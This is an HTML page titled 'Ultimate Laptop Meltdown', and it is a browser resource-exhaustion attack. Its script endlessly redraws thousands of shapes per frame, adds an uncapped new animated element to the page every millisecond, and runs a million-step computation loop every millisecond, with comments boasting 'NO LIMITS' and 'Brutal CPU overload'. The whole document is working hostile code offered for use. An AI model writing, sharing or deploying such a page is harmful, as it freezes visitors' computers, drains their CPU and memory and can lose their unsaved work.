<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ultimate Laptop Meltdown</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: black;
      color: white;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    .chaotic {
      position: absolute;
      font-size: 3rem;
      color: hsl(calc(360 * var(--hue)), 100%, 50%);
      animation: spin 0.05s linear infinite, bounce 0.1s ease-in-out infinite alternate;
    }

    @keyframes spin {
      from {
        transform: rotate(0deg);
      }
      to {
        transform: rotate(360deg);
      }
    }

    @keyframes bounce {
      from {
        transform: translateY(0);
      }
      to {
        transform: translateY(100vh);
      }
    }
  </style>
</head>
<body>
  <canvas id="canvas"></canvas>
  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    // Canvas rendering madness
    function drawShapes() {
      for (let i = 0; i < 2000; i++) {
        ctx.beginPath();
        ctx.arc(
          Math.random() * canvas.width,
          Math.random() * canvas.height,
          Math.random() * 50,
          0,
          Math.PI * 2
        );
        ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
        ctx.fill();
      }
    }

    function render() {
      drawShapes();
      requestAnimationFrame(render);
    }
    render();

    // 1ms DOM spam with NO LIMITS
    setInterval(() => {
      const div = document.createElement('div');
      div.textContent = 'ðŸ”¥ðŸ’£ðŸ’¥';
      div.style.left = `${Math.random() * 100}vw`;
      div.style.top = `${Math.random() * 100}vh`;
      div.style.fontSize = `${Math.random() * 60 + 10}px`;
      div.style.setProperty('--hue', Math.random());
      div.classList.add('chaotic');
      document.body.appendChild(div);
    }, 1); // Infinite DOM spam at 1ms intervals

    // Brutal CPU overload
    setInterval(() => {
      for (let i = 0; i < 1e6; i++) {
        Math.sin(Math.random()) * Math.sqrt(i);
      }
    }, 1); // 1ms computations
  </script>
</body>
</html>
